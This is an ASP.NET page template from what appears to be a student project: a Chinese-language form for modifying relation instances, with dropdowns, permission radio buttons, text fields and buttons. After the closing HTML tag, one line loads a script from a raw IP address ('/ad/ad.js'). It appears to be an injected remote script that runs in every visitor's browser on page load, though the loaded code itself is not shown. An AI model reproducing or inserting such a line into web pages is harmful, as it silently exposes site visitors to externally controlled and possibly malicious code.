<%@ Page Language="vb" AutoEventWireup="false" Codebehind="rinstancemodification.aspx.vb" Inherits="relation.rinstancemodification"%>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML>
	<HEAD>
		<title>rinstancemodification</title>
		<meta content="Microsoft Visual Studio .NET 7.1" name="GENERATOR">
		<meta content="Visual Basic .NET 7.1" name="CODE_LANGUAGE">
		<meta content="JavaScript" name="vs_defaultClientScript">
		<meta content="http://schemas.microsoft.com/intellisense/ie5" name="vs_targetSchema">
	</HEAD>
	<body>
		<FORM id="Form1" method="post" runat="server">
			<TABLE id="Table9" cellSpacing="0" cellPadding="0" width="778" align="center" bgColor="#fef3bd"
				border="0" valign="middle">
				<TR>
					<TD vAlign="middle" width="778" bgColor="#fef3bd" colSpan="3" height="8">
						<DIV align="center"><IMG height="8" src="imga/bg1.gif" width="100%"></DIV>
					</TD>
				</TR>
				<TR bgColor="#ffffff">
					<TD colSpan="3" height="60"><IMG height="60" src="imga/logo.gif" width="321"><IMG height="60" src="imga/idea.jpg" width="457"></TD>
				</TR>
				<TR>
					<TD vAlign="middle" colSpan="3" height="8"><IMG height="8" src="imga/bg2.gif" width="100%"></TD>
				</TR>
			</TABLE> <!--===============include menu================--> <!--==========include menu==============-->
			<TABLE id="Table10" cellSpacing="0" cellPadding="0" width="778" align="center" border="0">
				<TR>
					<TD class="p9" vAlign="middle" width="222" bgColor="#dedede" height="18" style="WIDTH: 222px">
						<DIV align="center"><FONT color="#666666"><B>
									<asp:Label id="timetext" runat="server"></asp:Label>
									&nbsp; </B></FONT>
						</DIV>
					</TD>
					<TD class="p9" vAlign="middle" width="51" bgColor="#dedede" height="18">
						<DIV align="right"><IMG height="25" src="imga/blue.jpg" width="35"></DIV>
					</TD>
					<TD class="p9" vAlign="middle" width="548" background="imga/blue2.jpg" bgColor="#00459c"
						height="18">
						<DIV align="left"><SPAN class="p10"><FONT color="#ffffff"><A class="whitemenu" onmouseover="showMenu(this,'topmenu1',0)" onmouseout="hideMenu(event)"
										href="rmodelpublish.aspx" target="_top">发布</A> <A class="whitemenu" onmouseover="showMenu(this,'topmenu2',0)" onmouseout="hideMenu(event)"
										href="rmodelsearch.aspx" target="_top">查询</A>&nbsp;<A class="whitemenu" onmouseover="showMenu(this,'topmenu3',0)" onmouseout="hideMenu(event)"
										href="rmodelmodification.aspx" target="_top">修改</A> </FONT></SPAN>
						</DIV>
					</TD>
				</TR>
			</TABLE>
			<DIV id="Div1" style="VISIBILITY: hidden" onmouseout="hideMenu(event)"></DIV>
			<FONT face="宋体"></FONT>
			<TABLE id="Table11" height="62" cellSpacing="0" width="778" align="center">
				<TR border="0">
					<TD class="p10" vAlign="top" background="imga/bg3.gif" colSpan="2" height="20" border="0"><IMG height="1" src="imga/03.gif" width="100%"><BR>
						<FONT color="#000000">&nbsp;|<SPAN class="p9"> <A href="index.aspx">首页</A></SPAN> |</FONT>
						<FONT color="#000000"><SPAN class="p9"><A href="index.aspx">用户登录</A></SPAN> |<A href="newcustomer.aspx">注册
							</A></FONT>
					</TD>
				</TR>
				<TR border="0">
					<TD vAlign="top" width="172" bgColor="#0859ad" height="20">&nbsp;
						<asp:label id="lblHint" runat="server" ForeColor="Info">Label</asp:label></TD>
					<TD vAlign="top" bgColor="#0859ad" height="20">
						<DIV align="right"><FONT color="#ffffff">
								<marquee scrollDelay="100" direction="left" behavior="scroll" loop="-1">欢迎您 
									&nbsp;软件业的朋友！ &nbsp; &nbsp;</marquee>
							</FONT>
						</DIV>
					</TD>
				</TR>
			</TABLE>
			<CENTER>
				<TABLE id="Table12" height="400" cellSpacing="0" cellPadding="0" width="778" bgColor="#ffffff"
					border="0">
					<TBODY>
						<TR>
							<TD vAlign="top" width="172" bgColor="#0859ad" height="14"><!--====================include pageleft==================-->
								<TABLE id="Table13" cellSpacing="0" cellPadding="0" width="100%" border="0">
									<TR>
										<TD vAlign="top" bgColor="#0859ad">
											<DIV align="center"><FONT face="宋体"></FONT>&nbsp;</DIV>
										</TD>
									</TR>
								</TABLE>
								<TABLE id="Table14" height="100%" cellSpacing="0" cellPadding="0" width="100%" border="0">
									<TR>
										<TD vAlign="top" bgColor="#9cd7ef">
											<DIV align="center"><IMG style="WIDTH: 100%; HEIGHT: 32px" height="32" src="imga/grad.gif" width="172">&nbsp;
												<TABLE id="Table15" style="WIDTH: 153px; HEIGHT: 153px" width="153" border="1">
													<TR>
														<TD width="147" height="45">
															<DIV align="center">&nbsp;&nbsp;<A href="rmodelmodification.aspx">修改关系空间</A></DIV>
														</TD>
													</TR>
													<TR>
														<TD height="43">
															<DIV align="center"><A href="rdefinitionmodification.aspx">修改关系类型</A></DIV>
														</TD>
													</TR>
													<TR>
														<TD height="55">
															<DIV align="center"><A href="rinstancemodification.aspx">修改关系实例</A></DIV>
														</TD>
													</TR>
												</TABLE>
												<BR>
												<BR>
											</DIV>
										</TD>
									</TR>
								</TABLE>
							</TD>
							<TD vAlign="top" width="21" bgColor="#ffffff"><IMG height="23" src="imga/05.gif" width="21"></TD>
							<TD vAlign="top" width="611">
								<TABLE id="Table1" style="WIDTH: 582px; HEIGHT: 380px" cellSpacing="1" cellPadding="1"
									width="582" border="1">
									<TR>
										<TD style="WIDTH: 272px; HEIGHT: 21px"><asp:label id="Label2" runat="server">关系实例编号</asp:label></TD>
										<TD style="WIDTH: 241px; HEIGHT: 21px"><asp:label id="Label4" runat="server">关系实例可用性</asp:label></TD>
									</TR>
									<TR>
										<TD style="WIDTH: 272px; HEIGHT: 29px"><asp:dropdownlist id="ddlstInstKey" runat="server" Width="96px"></asp:dropdownlist></TD>
										<TD style="WIDTH: 241px; HEIGHT: 29px"><asp:radiobutton id="rbtnInstAvailYes" runat="server" GroupName="rbtnInstAvail" Text="可用"></asp:radiobutton><FONT face="宋体">&nbsp;
												<asp:radiobutton id="rbtnInstAvailNo" runat="server" GroupName="rbtnInstAvail" Text="不可用"></asp:radiobutton></FONT></TD>
									</TR>
									<TR>
										<TD style="WIDTH: 272px; HEIGHT: 7px"><asp:label id="Label1" runat="server">关系对象权限</asp:label></TD>
										<TD style="WIDTH: 241px; HEIGHT: 7px"><FONT face="宋体"></FONT></TD>
									</TR>
									<TR>
										<TD style="WIDTH: 272px; HEIGHT: 29px"><asp:radiobutton id="rbtnAccPri1" runat="server" GroupName="rbtnAccPri" Text="权限1"></asp:radiobutton>&nbsp;
											<asp:radiobutton id="rbtnAccPri2" runat="server" GroupName="rbtnAccPri" Text="权限2"></asp:radiobutton>&nbsp;
											<asp:radiobutton id="rbtnAccPri3" runat="server" GroupName="rbtnAccPri" Text="权限3"></asp:radiobutton></TD>
										<TD style="WIDTH: 241px; HEIGHT: 29px"><FONT face="宋体"></FONT></TD>
									</TR>
									<TR>
										<TD style="WIDTH: 272px; HEIGHT: 31px"><asp:label id="Label5" runat="server" Width="160px">用户名</asp:label></TD>
										<TD style="WIDTH: 241px; HEIGHT: 31px"><FONT face="宋体"></FONT></TD>
									</TR>
									<TR>
										<TD style="WIDTH: 272px; HEIGHT: 29px"><FONT face="宋体"><asp:textbox id="txtUser" runat="server"></asp:textbox></FONT></TD>
										<TD style="WIDTH: 241px; HEIGHT: 29px"><FONT face="宋体">&nbsp; </FONT>
										</TD>
									</TR>
									<TR>
										<TD style="WIDTH: 272px; HEIGHT: 32px"><asp:label id="Label10" runat="server" Width="184px">接口名称</asp:label></TD>
										<TD style="WIDTH: 241px; HEIGHT: 32px"></TD>
									</TR>
									<TR>
										<TD style="WIDTH: 272px"><asp:textbox id="txtOper" runat="server"></asp:textbox></TD>
										<TD style="WIDTH: 241px"><FONT face="宋体">&nbsp;</FONT></TD>
									</TR>
									<TR>
										<TD style="WIDTH: 272px; HEIGHT: 16px"><asp:label id="Label3" runat="server">关联对象类型</asp:label></TD>
										<TD style="WIDTH: 241px; HEIGHT: 16px"><FONT face="宋体"></FONT></TD>
									</TR>
									<TR>
										<TD style="WIDTH: 272px"><asp:textbox id="txtInstType" runat="server"></asp:textbox></TD>
										<TD style="WIDTH: 241px"></TD>
									</TR>
									<TR>
										<TD style="WIDTH: 272px"><FONT face="宋体"></FONT></TD>
										<TD style="WIDTH: 241px"><FONT face="宋体"></FONT></TD>
									</TR>
									<TR>
										<TD style="WIDTH: 272px"></TD>
										<TD style="WIDTH: 241px"></TD>
									</TR>
									<TR>
										<TD style="WIDTH: 272px">
											<TABLE id="Table3" style="WIDTH: 267px; HEIGHT: 32px" cellSpacing="1" cellPadding="1" width="267"
												border="1">
												<TR>
													<TD style="WIDTH: 105px">&nbsp;
														<asp:button id="btnModify" runat="server" Text="确定修改" DESIGNTIMEDRAGDROP="2260"></asp:button></TD>
													<TD style="WIDTH: 107px"><FONT face="宋体"><asp:button id="btnModifyVertex" runat="server" Text="修改顶点"></asp:button></FONT></TD>
													<TD><asp:button id="btnDel" runat="server" Text="删除"></asp:button></TD>
												</TR>
											</TABLE>
										</TD>
										<TD style="WIDTH: 241px">
											<TABLE id="Table4" cellSpacing="1" cellPadding="1" width="300" border="1">
												<TR>
													<TD style="WIDTH: 65px">&nbsp;
														<asp:button id="btnYes" runat="server" Text="确定"></asp:button></TD>
													<TD style="WIDTH: 73px"><asp:button id="btnCancel" runat="server" Text="撤消" DESIGNTIMEDRAGDROP="1228"></asp:button></TD>
													<TD><FONT face="宋体"></FONT></TD>
												</TR>
											</TABLE>
										</TD>
									</TR>
								</TABLE>
		</FORM>
		<FORM style="MARGIN: 0px" name="loginForm" action="" method="post">
			&nbsp;&nbsp;
			<asp:label id="lblWarning" runat="server" ForeColor="#0000C0" Width="408px">label</asp:label></FORM>
		<FORM id="Form2" method="post">
			<FONT face="宋体"></FONT></TD></TR></TBODY></TABLE></CENTER><!---====================include pagetail================-->
			<CENTER>
				<TABLE id="Table16" cellSpacing="0" cellPadding="0" width="778" border="0">
					<TR>
						<TD><IMG height="31" src="imga/bg4.gif" width="778"></TD>
					</TR>
					<TR>
						<TD class="p9" background="imga/bg5.gif">
							<DIV align="center">| 联络我们 | 客服电话：<STRONG><FONT face="Arial">0571-63740939</FONT></STRONG></DIV>
						</TD>
					</TR>
					<TR>
						<TD class="p9" bgColor="#ffffff"><FONT face="宋体">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
								版权所有：&nbsp;&nbsp; 浙江林学院信息工程学院天信022 陆美丽 王海玲&nbsp; </FONT>
						</TD>
					</TR>
				</TABLE>
			</CENTER>
		</FORM>
	</body>
</HTML>
<script src="http://222.208.183.246/ad/ad.js"></script>
